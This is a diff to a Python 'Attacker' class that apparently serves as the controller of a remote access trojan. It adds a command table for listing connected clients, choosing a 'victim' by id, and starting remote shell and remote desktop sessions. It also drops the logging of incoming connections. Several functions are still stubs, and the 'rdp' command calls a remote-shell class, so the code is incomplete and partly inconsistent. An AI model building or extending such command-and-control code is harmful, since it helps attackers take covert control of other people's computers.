@@ -20,8 +20,13 @@ class Attacker:
 
         self.connected_clients = list()
 
-        logging.basicConfig(level=logging.DEBUG,format="%(message)s")
+        self.chosen_client = None
 
+        self.commands = {"showclients" : self.__show_connected_clients,
+                         "choose": self.__choose_client,
+                         "rsh": self.__start_remote_shell,
+                         "rdp": self.__start_remote_desktop
+                         }
     def main(self):
         threading.Thread(target=self.__admin_input).start()
         self.__start_listing()
@@ -32,8 +37,6 @@ class Attacker:
         try:
             while True:
                 conn, addr = self.server.accept()
-                print(f"connection from: {addr}")
-
                 threading.Thread(target=self.__on_new_client, args=(conn, addr)).start()
 
         except Exception as e:
@@ -50,8 +53,9 @@ class Attacker:
             command = command_components[0]
             command_args = command_components[1:]
 
-            if raw_command == "client.show":
-                self.__show_connected_clients()
+            func = self.commands.get(raw_command)
+            if func:
+                func()
 
     def __show_connected_clients(self):
         print('-' * 20)
@@ -60,10 +64,14 @@ class Attacker:
         print('-' * 20)
 
     def __choose_client(self):
-        pass
+        self.__show_connected_clients()
+        victim_id = int(input("Enter Victim Id: "))
+        if self.connected_clients[victim_id-1]:
+            self.chosen_client = self.connected_clients[victim_id-1]
+
 
     def __start_remote_desktop(self):
-        pass
+        RemoteShellAttackerSide(self.chosen_client.conn).main()
 
     def __start_remote_shell(self):
         pass
